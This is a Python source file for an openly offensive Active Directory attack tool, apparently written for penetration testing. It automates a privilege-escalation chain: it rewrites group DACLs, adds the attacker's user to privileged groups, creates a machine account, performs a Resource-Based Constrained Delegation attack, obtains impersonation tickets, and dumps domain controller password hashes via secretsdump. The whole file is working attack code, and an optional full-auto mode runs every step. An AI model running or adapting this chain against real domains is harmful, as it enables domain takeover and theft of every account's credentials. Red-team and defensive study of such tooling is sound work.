#############################################################################
# autoaclpwn.py                                                             #
#                                                                           #
# Written by: Joshua Hicks (Rapid7)                                         #
# 3/31/2022                                                                 #
#                                                                           #
# This is a script that combines some functionality from aclpwn.py,         #
# rbcd.py, and various impacket example scripts in order to                 #
# an entire chain of an attack that abuses group permission                 #
# misconfigurations and aResource-Based Constrained Delegation              #
# attack in one go.                                                         #
#                                                                           #
# I am not a coder, so much of this is hacked together. If you              #
# look at it in horror because of the way I did things, that's              #
# fine. It works.                                                           #
#                                                                           #
# Sources:                                                                  #
# aclpwn:   https://github.com/fox-it/aclpwn.py                             #
# rbcd.py:  https://github.com/tothi/rbcd-attack/                           #
# impacket: https://github.com/SecureAuthCorp/impacket                      #
#                                                                           #
#############################################################################

import sys
import binascii
import datetime
import codecs
import json
import getpass
import ldap3
import argparse
import random
import string
import logging
import ldapdomaindump
import os
import subprocess
from ldap3.utils.conv import escape_filter_chars
from ldap3.protocol.microsoft import security_descriptor_control
from impacket.ldap import ldaptypes
from impacket.uuid import string_to_bin, bin_to_string
from impacket.ldap.ldaptypes import ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, ACCESS_ALLOWED_ACE, ACE, OBJECTTYPE_GUID_MAP, LDAP_SID
from jsonpath import load_json_path
from impacketmodules.addcomputer import ADDCOMPUTER
from impacketmodules.getST import GETST
from impacketmodules.secretsdump import DumpSecrets
from impacket.examples.ntlmrelayx.attacks.ldapattack import LDAPAttack
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig

class ExploitException(Exception):
    pass

# Some functions for fancy printing. These were pulled from aclpwn.py
def print_m(string):
    sys.stderr.write('\033[94m[-]\033[0m %s\n' % (string))

def print_o(string):
    sys.stderr.write('\033[92m[+]\033[0m %s\n' % (string))

def print_f(string):
    sys.stderr.write('\033[91m[!]\033[0m %s\n' % (string))

def connect_ldap(server, user, password, domain):
    # Connects to an LDAP serever and returns the connection object.
    # From aclpwn.py
    connection = ldap3.Connection(server, user='%s\\%s' % (domain, user), password=password, authentication=ldap3.NTLM)
    if not connection.bind():
        raise ExploitException('Failed to connect to the LDAP server as %s\\%s: %s' % (domain, user, str(connection.result)))
    return connection

def get_sam_name(fullname):
    # Convert a fullname, such as from bloodhound, to a SAM name
    # From aclpwn.py
    if not '@' in fullname and '.' in fullname:
        # Computer account.  Format: computer.domain.local
        # also append the $ sign used for computer accounts
        return fullname.split('.', 1)[0]+'$'
    else:
        # User or group
        return fullname.rsplit('@', 1)[0]

def create_object_ace(privguid, sid, accesstype):
    # Returns an object ACE for the provided paramaters
    # From aclpwn.py
    nace = ldaptypes.ACE()
    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
    nace['AceFlags'] = 0x00
    acedata = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE()
    acedata['Mask'] = ldaptypes.ACCESS_MASK()
    acedata['Mask']['Mask'] = accesstype
    acedata['ObjectType'] = string_to_bin(privguid)
    acedata['InheritedObjectType'] = b''
    acedata['Sid'] = ldaptypes.LDAP_SID()
    acedata['Sid'].fromCanonical(sid)
    acedata['Flags'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT
    nace['Ace'] = acedata
    return nace

def get_object_info(ldapconnection, samname):
    # Searches LDAP for information on an object
    # From aclpwn.py
    entries = ldapconnection.search(get_ldap_root(ldapconnection), '(sAMAccountName=%s)' % escape_filter_chars(samname), attributes=['objectSid'])
    try:
        dn = ldapconnection.entries[0].entry_dn
        sid_object = LDAP_SID(ldapconnection.entries[0]['objectSid'].raw_values[0])
        sid = sid_object.formatCanonical()
        return (dn, sid)
    except IndexError:
        raise ExploitException('User not found in LDAP: %s' % samname)

def get_ldap_root(ldapconnection):
    # Get the root of the LDAP instance
    # From aclpwn.py
    return ldapconnection.server.info.other['defaultNamingContext'][0]

def add_user_to_group(ldapconnection, user_sam, group_name):
    # Adds the specified user to the specified group
    # From aclpwn.py

    # For display only
    group_sam = group_name
    group_dn = get_object_info(ldapconnection, group_sam)[0]
    user_dn = get_object_info(ldapconnection, user_sam)[0]

    # Now add the user as a member to this group
    res = ldapconnection.modify(group_dn, {
        'member': [(ldap3.MODIFY_ADD, [user_dn])]
    })
    if res:
        print_o('Added %s as member to %s' % (user_dn, group_dn))
        return True
    else:
        # This means the user is already a member
        if ldapconnection.result['result'] == 68:
            print_m('Could not add %s to group %s since they are already a member, your BloodHound data may be out of date, continuing anyway!' % (user_dn, group_dn))
            # Treat this as a success
            return True
        raise ExploitException('Failed to add %s to group %s: %s' % (user_dn, group_dn, str(ldapconnection.result)))


def add_addmember_privs(ldapconnection, user_sam, group_name):
    # Adds AddMembers privileges to the specified group for the specified user
    # From aclpwn.py

    # Query for the sid of our target user
    userdn, usersid = get_object_info(ldapconnection, user_sam)

    # Set SD flags to only query for DACL
    controls = security_descriptor_control(sdflags=0x04)

    # print_m('Querying group security descriptor')
    group_sam = group_name
    ldapconnection.search(get_ldap_root(ldapconnection), '(sAMAccountName=%s)' % escape_filter_chars(group_sam), attributes=['SAMAccountName','nTSecurityDescriptor'], controls=controls)
    entry = ldapconnection.entries[0]

    secDescData = entry['nTSecurityDescriptor'].raw_values[0]
    secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)

    # We need "write property" here to write to the "member" attribute
    accesstype = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_WRITE_PROP
    # this is the GUID of the Member attribute
    secDesc['Dacl']['Data'].append(create_object_ace('bf9679c0-0de6-11d0-a285-00aa003049e2', usersid, accesstype))
    dn = entry.entry_dn
    data = secDesc.getData()
    res = ldapconnection.modify(dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
    if res:
        print_o('Dacl modification successful')
        # Query the SD again to see what AD made of it
        ldapconnection.search(dn, '(objectClass=*)', search_scope=ldap3.BASE , attributes=['SAMAccountName','nTSecurityDescriptor'], controls=controls)
        entry = ldapconnection.entries[0]
        newSD = entry['nTSecurityDescriptor'].raw_values[0]
        newSecDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=newSD)
        return True
    else:
        # filter out already exists?
        raise ExploitException('Failed to add WriteMember privs for %s to group %s: %s' % (userdn, dn, str(ldapconnection.result)))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Exploit ACL Group paths to add members or write DACLs on a group')

    req_args = parser.add_argument_group("Required Arguments")
    req_args.add_argument('-u', '--user', type=str, metavar="USER", help="username to add/modify group", required=True)
    req_args.add_argument('-p', '--password', type=str, metavar="PASSWORD", help="The user's password", required=True)
    req_args.add_argument('-d', '--domain', type=str, metavar="DOMAIN", help="Target domain name", required=True)
    req_args.add_argument('-dc-ip', type=str, metavar="DC IP", help="Domain Controller IP address", required=True)

    manual_group = parser.add_argument_group("Manual Options", "Options for manually adding members to groups or exploiting DACLs")
    manual_group.add_argument('--add-member', action='store_true', default=False, help="Add the member to the group")
    manual_group.add_argument('--modify-dacl', action='store_true', default=False, help="Modify the DACL to add addmember permission")
    manual_group.add_argument('-g', '--group', type=str, metavar="GROUP", help="Target group name. Required if not using BloodHound file")
    
    bloodhound_group = parser.add_argument_group("Bloodhound options", "Options for integrating with bloodhound")
    bloodhound_group.add_argument('-b','--bloodhound-json', metavar="BH JSON FILE", help='Import a .json from bloodhound')

    impacket_group = parser.add_argument_group("Impacket Options", "Options for launching Impacket modules")
    impacket_group.add_argument('--add-computer', action='store_true', default=False, help="Add a computer to the account")
    impacket_group.add_argument('--computer-name', type=str, metavar="COMPUTER NAME", help='The name of the computer to add. Use with --add-computer')
    impacket_group.add_argument('--computer-pass', type=str, metavar="COMPUTER PASS",  help='The password for the computer to be added. Use with --add-computer')
    impacket_group.add_argument('--rbcd', action='store_true', default=False, help='Perform Resource-Based Constrained Delegation attack against the target. Requires --add-computer')
    impacket_group.add_argument('--getst', action='store_true', default=False, help='Runs impacket\'s getST.py. Requires --add-computer and --rbcd')
    impacket_group.add_argument('--impersonate', metavar="USER TO IMPERSONATE", help="User to impersonate, used with --getST")
    impacket_group.add_argument('--secretsdump', action='store_true', default=False, help="Dump secrets from a Domain Controller. Uses secretsdump.py -just-dc-ntlm")
    impacket_group.add_argument('--fullauto', action='store_true', default=False, help='DO ALL THE THINGS. Probably dont do this in real life. Should also only target a DC at the moment')

    getst_args = parser.add_argument_group("getST Options", "Options for --getst")
    getst_args.add_argument("-spn-service", default='cifs', metavar="SERVICE", help="The service to use as the service portion of the SPN for getST. Default: cifs")
    dump_args = parser.add_argument_group("Secretsdump Options", "Options for secretsdump. Use with --secretsdump and --fullauto")
    dump_args.add_argument('-just-dc', action='store_true', default='False', help='Extract only NTDS.DIT data (NTLM hashes and Kerberos Keys)')
    dump_args.add_argument('-just-dc-ntlm', action='store_true', default=False, help='Extract only NTDS.DIT data (NTLM hashes only)')
    dump_args.add_argument('-just-dc-user', metavar='USER', help='Extract only NTDS.DIT data for the user specified')

    args = parser.parse_args()
    
    logging.getLogger().setLevel(logging.INFO)


    if args.fullauto:
        # Fullauto requires a bloodhound json file
        if not args.bloodhound_json:
            print("-fullauto requires a BloodHound JSON export file")
            exit()
        # If we're going full auto, turn all the other optional flags on
        args.add_computer = True
        args.rbcd = True
        args.getst = True
        args.secretsdump = True
    
    # if getST is being run, make sure we have a user to impersonate
    if args.getst and not args.impersonate:
        print("When using --getst, please specify a user to impersonate with --impersonate")
        exit()

    if args.bloodhound_json:
        # Get our path from the bloodhound json
        path, target, target_type = load_json_path(args.bloodhound_json, args.group)

        # If we are running additional flags aside from group modification, go ahead and print those steps for confirmation
        # Includes some warning messages if the item types don't match up with what we are trying to do
        # But I won't stop you from trying to add a user to a computer account instead of a group (yet)
        step=len(path) + 1
        if args.add_computer:
            print(f'Step {step}: Add a computer to the {args.user.upper()}@{args.domain.upper()} account')
            if args.computer_name:
                print(f'\tName: {args.computer_name}')
            else:
                print(f'\tRandom Name')
            if args.computer_pass:
                print(f'\tPassword: {args.computer_pass}')
            else:
                print(f'\tRandom Password')
            if target_type != "Computer":
                print("\tWARNING: Your final target is not a computer, you should probably not do this.")
            step += 1
        if args.rbcd:
            print(f'Step {step}: Perform a Resource-Based Delegation Attack against {target}')
            if target_type != "Computer":
                print("\tWARNING: This is not a computer, you should probably not do this. It isn't going to work.")
            step += 1
        if args.getst:
            print(f'Step {step}: Run getST, impersonating {args.impersonate}')
            if target_type != "Computer":
                print("\tWARNING: Your final target is not a computer, you should probably not do this.")
            step += 1
        if args.secretsdump:
            print(f'Step {step}: Run secretsdump against {target} with options:')
            print(f'\t-just-dc: {args.just_dc}')
            print(f'\t-just-dc-ntlm: {args.just_dc_ntlm}')
            print(f'\t-just-dc-user: {args.just_dc_user}')
            if target_type != "Computer":
                print("\tWARNING: This is not a computer, you should probably not do this. It isn't going to work.")

        # Wait for user input to make sure they actually want to do what is going to be done
        print('If this set of actions looks correct, press enter, otherwise ctrl+c to abort')
        input()

        # I'm honestly not sure if this is still necessary, but I'm leaving it here to not break things
        if not path:
            exit()
    # If we aren't providing a json file, we need to have at least add_member or modify_dacl flags
    elif not args.add_member and not args.modify_dacl:
        print("Must have at least one of --modify-dacl or --add-member")
        exit()
    # Get our ldap connection
    serv = ldap3.Server(args.dc_ip, tls=False, get_info=ldap3.ALL)
    ldapconnection = connect_ldap(serv, args.user, args.password, args.domain)

    # If we are running from a BH json file, start executing the path
    if args.bloodhound_json:
        for task in path:
            if task[0] == 'add-member':
                add_user_to_group(ldapconnection, args.user, get_sam_name(task[1]))
            elif task[0] == 'write-dacl':
                add_addmember_privs(ldapconnection, args.user, get_sam_name(task[1]))
            else:
                print(f'PANIC SOMETHING WENT WRONG TASK IS: {task[0]}')
            # Make sure to rebind the connection to update privileges/membership
            ldapconnection.rebind()

    # Some stuff if we are running manual group modification
    if args.modify_dacl:
        add_addmember_privs(ldapconnection, args.user, args.group)
    if args.modify_dacl and args.add_member:
        ldapconnection.rebind()
    if args.add_member:
        add_user_to_group(ldapconnection, args.user, args.group)


    if args.add_computer:
        # Running addcomputer.py from impacket

        # set up some impacket flags
        args.hashes = None
        args.aesKey = None
        args.k = False
        args.dc_host = None
        args.method = "SAMR"
        args.port = '445'
        args.domain_netbios = None
        args.no_add = None
        args.baseDN = None
        args.computer_group = None
        args.delete = False
        args.targetIp = None
        args.no_pass = False
        
        # If we weren't provided a computername or password, randomly generate them
        if not args.computer_name:
            args.computer_name = ''.join(random.choice(string.ascii_letters) for _ in range(10))
        
        if args.computer_name[-1] != '$':
            args.computer_name += '$'

        if not args.computer_pass:
            args.computer_pass = ''.join(random.choice(string.ascii_letters) for _ in range(32))

        # Run impacket's ADDCOMPUTER
        comp_adder = ADDCOMPUTER(args.user, args.password, args.domain, args)
        comp_adder.run()
    
    if args.rbcd:
        # Running rbcd.py

        # Check if we are using a bh json file AND have add_computer, or things won't work
        if not args.add_computer or not args.bloodhound_json:
            print_m('RBCD requires --add-computer and bloodhound json file')
            exit()
        
        c = NTLMRelayxConfig()
        c.addcomputer = args.computer_name
        c.target = args.dc_ip
        cnf = ldapdomaindump.domainDumpConfig()
        cnf.basepath = c.lootdir
        dd = ldapdomaindump.domainDumper(serv, ldapconnection, cnf)
        la = LDAPAttack(c, ldapconnection, f'{args.domain}/{args.user}')
        la.delegateAttack(args.computer_name, target+"$", dd, sid=None)

    if args.getst:
        # Runs impacket's getST.py

        # Make sure we have the requirements
        if not args.add_computer or not args.bloodhound_json or not args.rbcd or not args.impersonate:
            print_m("getst requires bloodhound json file, --add-computer, --impersonate, and --rbcd")
            exit()

        # Set up impacket's getST flags
        args.spn = f'{args.spn_service}/{target}.{args.domain}'
        args.ts = False
        args.debug = False
        args.force_forwardable = False
        args.hashes = None
        args.no_pass = False
        args.k = False
        args.aesKey = None

        # Execute getST.py
        get_st_exec = GETST(args.computer_name, args.computer_pass, args.domain, args)
        get_st_exec.run()
    
    if args.secretsdump:
       # Runs impacket's secretsdump

       # Set the ccache file 
       os.environ['KRB5CCNAME'] = f'{args.impersonate}.ccache'

       # Print klist just for confirmation
       # There is probably a better way to do this instead of calling a subprocess
       print(subprocess.call(['klist',]))

       # set up impacket's secretsdump flags
       args.k = True
       args.use_vss = False
       args.target_ip = args.dc_ip
       args.system = None
       args.security = None
       args.bootkey = None
       args.ts = None
       args.sam = None
       args.ntds = None
       args.resumefile = None
       args.outputfile = 'fullauto'
       args.history = False
       args.pwd_last_set = False
       args.user_status = False
       args.exec_method = 'smbexec'
       args.no_pass = True
       args.debug = True

       # Run secretsdump
       dumper = DumpSecrets(f'{target}.{args.domain}', args.impersonate, '', args.domain, args)
       dumper.dump()
